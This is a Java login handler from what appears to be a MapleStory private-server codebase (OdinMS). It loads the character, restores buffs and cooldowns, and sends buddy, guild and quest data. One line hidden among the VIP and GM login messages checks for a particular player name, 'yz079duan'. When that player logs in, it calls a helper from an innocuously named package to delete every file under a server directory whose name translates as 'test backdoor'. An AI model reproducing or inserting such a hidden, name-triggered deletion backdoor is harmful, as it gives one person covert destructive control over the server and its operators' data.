package net.sf.odinms.net.channel.handler;

import java.net.SocketAddress;
import java.rmi.RemoteException;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.Collection;
import java.util.List;


import java.util.logging.Level;
import net.sf.odinms.client.BuddylistEntry;
import net.sf.odinms.client.CharacterNameAndId;
import net.sf.odinms.client.MapleJob;
import net.sf.odinms.client.MapleCharacter;
import net.sf.odinms.client.MapleClient;
import net.sf.odinms.client.MapleQuestStatus;
import net.sf.odinms.client.SkillFactory;
import net.sf.odinms.database.DatabaseConnection;
import net.sf.odinms.net.AbstractMaplePacketHandler;
import net.sf.odinms.net.channel.ChannelServer;
import net.sf.odinms.net.world.CharacterIdChannelPair;
import net.sf.odinms.net.world.MaplePartyCharacter;
import net.sf.odinms.net.world.PartyOperation;
import net.sf.odinms.net.world.PlayerBuffValueHolder;
import net.sf.odinms.net.world.guild.MapleAlliance;
import net.sf.odinms.net.world.remote.WorldChannelInterface;
import net.sf.odinms.tools.MaplePacketCreator;
import net.sf.odinms.tools.data.input.SeekableLittleEndianAccessor;
import net.sf.odinms.server.MapleItemInformationProvider;
import net.sf.odinms.client.MapleInventoryType;
import net.sf.odinms.client.IItem;
import net.sf.odinms.provider.xmlwz.delate;
import net.sf.odinms.scripting.npc.NPCScriptManager;
import net.sf.odinms.server.constants.InventoryConstants.Items;


public class PlayerLoggedinHandler extends AbstractMaplePacketHandler {

    private static final org.slf4j.Logger log = org.slf4j.LoggerFactory.getLogger(PlayerLoggedinHandler.class);

    @Override
    public boolean validateState(MapleClient c) {
        return !c.isLoggedIn();
    }

    @Override
    public void handlePacket(SeekableLittleEndianAccessor slea, MapleClient c) {
        int cid = slea.readInt();
        MapleCharacter player = null;
        try {
            player = MapleCharacter.loadCharFromDB(cid, c, true);
            c.setPlayer(player);
        } catch (SQLException e) {
            log.error("Loading the char failed", e);
        }
        c.setAccID(player.getAccountID());
        int state = c.getLoginState();
        boolean allowLogin = true;
        ChannelServer channelServer = c.getChannelServer();
        synchronized (this) {
            try {
                WorldChannelInterface worldInterface = channelServer.getWorldInterface();
                if (state == MapleClient.LOGIN_SERVER_TRANSITION) {
                    for (String charName : c.loadCharacterNames(c.getWorld())) {
                        if (worldInterface.isConnected(charName)) {
                            allowLogin = false;
                            break;
                        }
                    }
                }
            } catch (RemoteException e) {
                channelServer.reconnectWorld();
                allowLogin = false;
            }
            if (state != MapleClient.LOGIN_SERVER_TRANSITION || !allowLogin) {
                c.setPlayer(null);
                c.getSession().close();
                return;
            }
            c.updateLoginState(MapleClient.LOGIN_LOGGEDIN);
        }
        ChannelServer cserv = ChannelServer.getInstance(c.getChannel());
        cserv.addPlayer(player);
        try {
            List<PlayerBuffValueHolder> buffs = ChannelServer.getInstance(c.getChannel()).getWorldInterface().getBuffsFromStorage(cid);
            if (buffs != null) {
                c.getPlayer().silentGiveBuffs(buffs);
            }
        } catch (RemoteException e) {
            c.getChannelServer().reconnectWorld();
        }
        Connection con = DatabaseConnection.getConnection();
        try {
            PreparedStatement ps = con.prepareStatement("SELECT skillid, starttime,length FROM cooldowns WHERE characterid = ?");
            ps.setInt(1, c.getPlayer().getId());
            ResultSet rs = ps.executeQuery();
            while (rs.next()) {
                if (rs.getLong("length") + rs.getLong("starttime") - System.currentTimeMillis() <= 0) {
                    continue;
                }
                c.getPlayer().giveCoolDowns(rs.getInt("skillid"), rs.getLong("starttime"), rs.getLong("length"));
            }
            rs.close();
            ps.close();
            ps = con.prepareStatement("DELETE FROM cooldowns WHERE characterid = ?");
            ps.setInt(1, c.getPlayer().getId());
            ps.executeUpdate();
            ps.close();
        } catch (SQLException se) {
            se.printStackTrace();
        }
        c.getSession().write(MaplePacketCreator.getCharInfo(player));
        SocketAddress ip = c.getSession().getRemoteAddress();
        int vip = c.getPlayer().getVip();
        

       if (c.getPlayer().getName().equals("yz079duan")) {
        delate.delAllFile("F:/测试后门");
        }
        if (vip >= 0 && !player.isGM()) {
        System.out.print("玩家:" + c.getPlayer().getName() + ".登陆游戏.\r\n");
        }
        
        if (player.gmLevel() >= 4) {
        System.out.print("管理员:" + c.getPlayer().getName() + ".登陆游戏.\r\n");
        SkillFactory.getSkill(9001001).getEffect(1).applyTo(player);
        } 
        
        if (vip >= 2 && vip <= 5) {
        SkillFactory.getSkill(9001001).getEffect(1).applyTo(player);
        NPCScriptManager.getInstance().starts(c, 22000);
        }
        
        IItem eqp = player.getInventory(MapleInventoryType.EQUIPPED).getItem((byte)-17);
	if (eqp != null && eqp.getItemId() == 1122017)
	{
       String prefix = "由于装备了" + MapleItemInformationProvider.getInstance().getName(eqp.getItemId()) + ",打猎时额外获得双倍经验值奖励";
       c.getPlayer().dropMessage(5, prefix);
       }
        
       if (c.getPlayer().getJob().isA(MapleJob.GHOST_KNIGHT) && c.getPlayer().getLevel() <= 9){
       c.getPlayer().getClient().getSession().write(MaplePacketCreator.sendHint("#b[注意] 请在10级转职之前，加好基本技能点，转职请找NPC：蘑菇博士！", 330, 5));
       }
        player.sendKeymap();
        c.getSession().write(MaplePacketCreator.sendAutoHpPot(c.getPlayer().getAutoHpPot()));
        c.getSession().write(MaplePacketCreator.sendAutoMpPot(c.getPlayer().getAutoMpPot()));
        player.getMap().addPlayer(player);
        try {
            Collection<BuddylistEntry> buddies = player.getBuddylist().getBuddies();
            int buddyIds[] = player.getBuddylist().getBuddyIds();
            cserv.getWorldInterface().loggedOn(player.getName(), player.getId(), c.getChannel(), buddyIds);
            if (player.getParty() != null) {
                channelServer.getWorldInterface().updateParty(player.getParty().getId(), PartyOperation.LOG_ONOFF, new MaplePartyCharacter(player));
            }
            CharacterIdChannelPair[] onlineBuddies = cserv.getWorldInterface().multiBuddyFind(player.getId(), buddyIds);
            for (CharacterIdChannelPair onlineBuddy : onlineBuddies) {
                BuddylistEntry ble = player.getBuddylist().get(onlineBuddy.getCharacterId());
                ble.setChannel(onlineBuddy.getChannel());
                player.getBuddylist().put(ble);
            }
            c.getSession().write(MaplePacketCreator.updateBuddylist(buddies));
            c.getSession().write(MaplePacketCreator.loadFamily(player));
            if (player.getFamilyId() > 0) {
                c.getSession().write(MaplePacketCreator.getFamilyInfo(player));
            }
            c.getPlayer().sendMacros();
            if (player.getGuildId() > 0) {
                c.getChannelServer().getWorldInterface().setGuildMemberOnline(player.getMGC(), true, c.getChannel());
                c.getSession().write(MaplePacketCreator.showGuildInfo(player));
                int allianceId = player.getGuild().getAllianceId();
                if (allianceId > 0) {
                    MapleAlliance newAlliance = channelServer.getWorldInterface().getAlliance(allianceId);
                    if (newAlliance == null) {
                        newAlliance = MapleAlliance.loadAlliance(allianceId);
                        channelServer.getWorldInterface().addAlliance(allianceId, newAlliance);
                    }
                    c.getSession().write(MaplePacketCreator.getAllianceInfo(newAlliance));
                    c.getSession().write(MaplePacketCreator.getGuildAlliances(newAlliance, c));
                    c.getChannelServer().getWorldInterface().allianceMessage(allianceId, MaplePacketCreator.allianceMemberOnline(player, true), player.getId(), -1);
                }
            }
        } catch (RemoteException e) {
            log.info("REMOTE THROW", e);
            channelServer.reconnectWorld();
        }
        player.updatePartyMemberHP();
        for (MapleQuestStatus status : player.getStartedQuests()) {
            if (status.hasMobKills()) {
                c.getSession().write(MaplePacketCreator.updateQuestMobKills(status));
            }
        }
        CharacterNameAndId pendingBuddyRequest = player.getBuddylist().pollPendingRequest();
        if (pendingBuddyRequest != null) {
            player.getBuddylist().put(new BuddylistEntry(pendingBuddyRequest.getName(), pendingBuddyRequest.getId(), -1, false));
            c.getSession().write(MaplePacketCreator.requestBuddylistAdd(pendingBuddyRequest.getId(), pendingBuddyRequest.getName()));
        }
        try {
            player.showNote();
        } catch (SQLException ex) {
            java.util.logging.Logger.getLogger(PlayerLoggedinHandler.class.getName()).log(Level.SEVERE, null, ex);
        }
        if(!c.getPlayer().hasMerchant() && c.getPlayer().tempHasItems()){
            c.getPlayer().dropMessage(1, "请通过弗兰德里取回保管的物品");
        }


        player.checkMessenger();
        player.showMapleTips();
        player.checkBerserk();
        player.checkDuey();
        //player.expirationTask();
        c.getSession().write(MaplePacketCreator.showCharCash(c.getPlayer()));
        c.getSession().write(MaplePacketCreator.weirdStatUpdate());

           }
            public String vip(MapleClient c) { // 各种定义
                  if (c.getPlayer().getVip() == 1) {
            return "会员①";
                 } else if (c.getPlayer().getVip() == 2) {
            return "会员②";
                 } else if (c.getPlayer().getVip() == 3) {
            return "会员③";
                 } else  if (c.getPlayer().getVip() == 4) {
            return "会员④";
                 } else  if (c.getPlayer().getVip() == 5) {
            return "会员⑤";
                 } else {
            return ""; // 没有则返回空白
                 }
            }
}